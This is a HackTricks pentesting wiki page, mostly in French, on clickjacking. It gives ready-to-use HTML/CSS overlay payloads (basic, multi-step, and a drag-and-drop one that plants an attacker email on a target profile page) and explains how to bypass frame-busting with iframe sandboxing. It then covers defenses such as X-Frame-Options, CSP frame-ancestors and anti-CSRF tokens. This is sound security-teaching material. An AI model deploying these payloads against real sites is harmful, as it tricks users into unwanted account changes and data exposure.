# Clickjacking

{{#include ../banners/hacktricks-training.md}}

## Qu'est-ce que le Clickjacking

Dans une attaque de clickjacking, un **utilisateur** est **trompé** pour **cliquer** sur un **élément** d'une page web qui est soit **invisible** soit déguisé en un élément différent. Cette manipulation peut entraîner des conséquences inattendues pour l'utilisateur, telles que le téléchargement de malware, la redirection vers des pages web malveillantes, la fourniture d'identifiants ou d'informations sensibles, des transferts d'argent, ou l'achat en ligne de produits.

### Astuce : préremplir des formulaires

Parfois, il est possible de **remplir la valeur des champs d'un formulaire à l'aide de paramètres GET lors du chargement d'une page**. Un attaquant peut abuser de ce comportement pour remplir un formulaire avec des données arbitraires et envoyer la payload de clickjacking afin que l'utilisateur appuie sur le bouton Submit.

### Remplir un formulaire avec Drag\&Drop

Si vous avez besoin que l'utilisateur **remplisse un formulaire** mais que vous ne voulez pas lui demander directement d'écrire certaines informations spécifiques (comme l'email ou un mot de passe spécifique que vous connaissez), vous pouvez simplement lui demander de **Drag\&Drop** quelque chose qui écrira vos données contrôlées comme dans [**this example**](https://lutfumertceylan.com.tr/posts/clickjacking-acc-takeover-drag-drop/).

### Payload basique
```css
<style>
iframe {
position:relative;
width: 500px;
height: 700px;
opacity: 0.1;
z-index: 2;
}
div {
position:absolute;
top:470px;
left:60px;
z-index: 1;
}
</style>
<div>Click me</div>
<iframe src="https://vulnerable.com/email?email=asd@asd.asd"></iframe>
```
### Payload en plusieurs étapes
```css
<style>
iframe {
position:relative;
width: 500px;
height: 500px;
opacity: 0.1;
z-index: 2;
}
.firstClick, .secondClick {
position:absolute;
top:330px;
left:60px;
z-index: 1;
}
.secondClick {
left:210px;
}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://vulnerable.net/account"></iframe>
```
### Glisser\&Déposer + Click payload
```css
<html>
<head>
<style>
#payload{
position: absolute;
top: 20px;
}
iframe{
width: 1000px;
height: 675px;
border: none;
}
.xss{
position: fixed;
background: #F00;
}
</style>
</head>
<body>
<div style="height: 26px;width: 250px;left: 41.5%;top: 340px;" class="xss">.</div>
<div style="height: 26px;width: 50px;left: 32%;top: 327px;background: #F8F;" class="xss">1. Click and press delete button</div>
<div style="height: 30px;width: 50px;left: 60%;bottom: 40px;background: #F5F;" class="xss">3.Click me</div>
<iframe sandbox="allow-modals allow-popups allow-forms allow-same-origin allow-scripts" style="opacity:0.3"src="https://target.com/panel/administration/profile/"></iframe>
<div id="payload" draggable="true" ondragstart="event.dataTransfer.setData('text/plain', 'attacker@gmail.com')"><h3>2.DRAG ME TO THE RED BOX</h3></div>
</body>
</html>
```
### XSS + Clickjacking

Si vous avez identifié une **attaque XSS qui nécessite qu’un utilisateur clique** sur un élément pour **déclencher** le XSS et que la page est **vulnérable au clickjacking**, vous pouvez en abuser pour tromper l’utilisateur afin qu’il clique sur le bouton/le lien.\
Exemple:\
Vous avez trouvé un **self XSS** dans certains détails privés du compte (détails que **seul vous pouvez définir et lire**). La page contenant le **formulaire** pour définir ces détails est **vulnérable** au **Clickjacking** et vous pouvez **préremplir** le **formulaire** avec des paramètres GET.\
Un attaquant pourrait préparer une attaque **Clickjacking** contre cette page en **préremplissant** le **formulaire** avec le **XSS payload** et en **trompant** l’**utilisateur** pour qu’il **soumette** le formulaire. Ainsi, **lorsque le formulaire est soumis** et que les valeurs sont modifiées, l’**utilisateur exécutera le XSS**.


### DoubleClickjacking

Firstly [explained in this post](https://securityaffairs.com/172572/hacking/doubleclickjacking-clickjacking-on-major-websites.html), this technique would ask the victim to double click on a button of a custom page placed in a specific location, and use the timing differences between mousedown and onclick events to load the victim page duing the double click so the **victim actually clicks a legit button in the victim page**.

An example could be seen in this video: [https://www.youtube.com/watch?v=4rGvRRMrD18](https://www.youtube.com/watch?v=4rGvRRMrD18)

A code example can be found in [this page](https://www.paulosyibelo.com/2024/12/doubleclickjacking-what.html).

> [!WARNING]
> Cette technique permet de tromper l’utilisateur pour qu’il clique en un seul endroit de la page victime en contournant toutes les protections contre le clickjacking. L’attaquant doit donc trouver des **actions sensibles réalisables en un seul clic, comme les invites OAuth acceptant des permissions**.

### Extensions de navigateur : DOM-based autofill clickjacking

En dehors de l'iframesation des pages victimes, les attaquants peuvent cibler les éléments UI des extensions de navigateur injectés dans la page. Les gestionnaires de mots de passe affichent des listes déroulantes d'autoremplissage près des champs focalisés ; en focalisant un champ contrôlé par l'attaquant et en cachant/occultant le menu déroulant de l'extension (astuces d'opacité/superposition/couche supérieure), un clic contraint de l'utilisateur peut sélectionner un élément stocké et remplir des données sensibles dans des champs contrôlés par l'attaquant. Cette variante ne nécessite aucune exposition via iframe et fonctionne entièrement via manipulation du DOM/CSS.

- For concrete techniques and PoCs see:
-
{{#ref}}
browser-extension-pentesting-methodology/browext-clickjacking.md
{{#endref}}

## Strategies to Mitigate Clickjacking

### Défenses côté client

Les scripts exécutés côté client peuvent effectuer des actions pour prévenir le Clickjacking :

- Vérifier que la fenêtre de l’application est la fenêtre principale (top window).
- Rendre tous les frames visibles.
- Empêcher les clics sur les frames invisibles.
- Détecter et alerter les utilisateurs en cas de tentatives potentielles de Clickjacking.

Cependant, ces scripts anti-frame peuvent être contournés :

- **Paramètres de sécurité des navigateurs :** Certains navigateurs peuvent bloquer ces scripts en fonction de leurs paramètres de sécurité ou d’un manque de support JavaScript.
- **Attribut sandbox de l’iframe HTML5 :** Un attaquant peut neutraliser les scripts anti-frame en définissant l’attribut sandbox avec les valeurs allow-forms ou allow-scripts sans allow-top-navigation. Cela empêche l’iframe de vérifier si elle est la top window, p. ex.,
```html
<iframe
id="victim_website"
src="https://victim-website.com"
sandbox="allow-forms allow-scripts"></iframe>
```
Les valeurs allow-forms et allow-scripts permettent des actions à l'intérieur de l'iframe tout en désactivant la navigation au niveau supérieur. Pour garantir le fonctionnement prévu du site ciblé, des permissions supplémentaires comme allow-same-origin et allow-modals peuvent être nécessaires, selon le type d'attaque. Les messages de la console du navigateur peuvent indiquer quelles permissions autoriser.

### Défenses côté serveur

#### X-Frame-Options

L'en-tête de réponse HTTP **X-Frame-Options** informe les navigateurs de la légitimité d'afficher une page dans un <frame> ou <iframe>, aidant à prévenir le Clickjacking :

- X-Frame-Options: deny - Aucun domaine ne peut afficher le contenu dans un frame.
- X-Frame-Options: sameorigin - Seul le site courant peut afficher le contenu dans un frame.
- X-Frame-Options: allow-from https://trusted.com - Seule l'URI spécifiée peut afficher la page dans un frame.
- Notez les limitations : si le navigateur ne prend pas en charge cette directive, cela peut ne pas fonctionner. Certains navigateurs préfèrent la directive CSP frame-ancestors.

#### Directive frame-ancestors de Content Security Policy (CSP)

**La directive frame-ancestors dans CSP** est la méthode recommandée pour la protection contre le Clickjacking :

- frame-ancestors 'none' - Semblable à X-Frame-Options: deny.
- frame-ancestors 'self' - Semblable à X-Frame-Options: sameorigin.
- frame-ancestors trusted.com - Semblable à X-Frame-Options: allow-from.

Par exemple, la CSP suivante autorise uniquement le framing depuis le même domaine :

Content-Security-Policy: frame-ancestors 'self';

Des détails supplémentaires et des exemples complexes se trouvent dans la [frame-ancestors CSP documentation](https://w3c.github.io/webappsec-csp/document/#directive-frame-ancestors) et [Mozilla's CSP frame-ancestors documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors).

### Content Security Policy (CSP) avec child-src et frame-src

**Content Security Policy (CSP)** est une mesure de sécurité qui aide à prévenir le Clickjacking et d'autres attaques par injection de code en spécifiant quelles sources le navigateur doit autoriser à charger du contenu.

#### Directive frame-src

- Définit les sources valides pour les frames.
- Plus spécifique que la directive default-src.
```
Content-Security-Policy: frame-src 'self' https://trusted-website.com;
```
Cette politique autorise les frames depuis la même origine (self) et https://trusted-website.com.

#### child-src Directive

- Introduite dans CSP niveau 2 pour définir les sources valides pour les web workers et les frames.
- Sert de repli pour frame-src et worker-src.
```
Content-Security-Policy: child-src 'self' https://trusted-website.com;
```
Cette politique autorise les frames et workers depuis la même origine (self) et https://trusted-website.com.

**Notes d'utilisation :**

- Dépréciation : child-src est en train d'être abandonné au profit de frame-src et worker-src.
- Comportement de repli : si frame-src est absent, child-src est utilisé comme repli pour les frames. Si les deux sont absents, default-src est utilisé.
- Définition stricte des sources : n'incluez que des sources de confiance dans les directives pour éviter toute exploitation.

#### JavaScript Frame-Breaking Scripts

Bien qu'ils ne soient pas complètement infaillibles, les JavaScript-based frame-busting scripts peuvent être utilisés pour empêcher qu'une page web soit affichée dans un frame. Exemple:
```javascript
if (top !== self) {
top.location = self.location
}
```
#### Utilisation des Anti-CSRF Tokens

- **Token Validation:** Utilisez des anti-CSRF tokens dans les applications web pour garantir que les requêtes modifiant l'état sont effectuées intentionnellement par l'utilisateur et non via une page Clickjacked.

## Références

- [**https://portswigger.net/web-security/clickjacking**](https://portswigger.net/web-security/clickjacking)
- [**https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html**](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html)
- [DOM-based Extension Clickjacking (marektoth.com)](https://marektoth.com/blog/dom-based-extension-clickjacking/)

{{#include ../banners/hacktricks-training.md}}
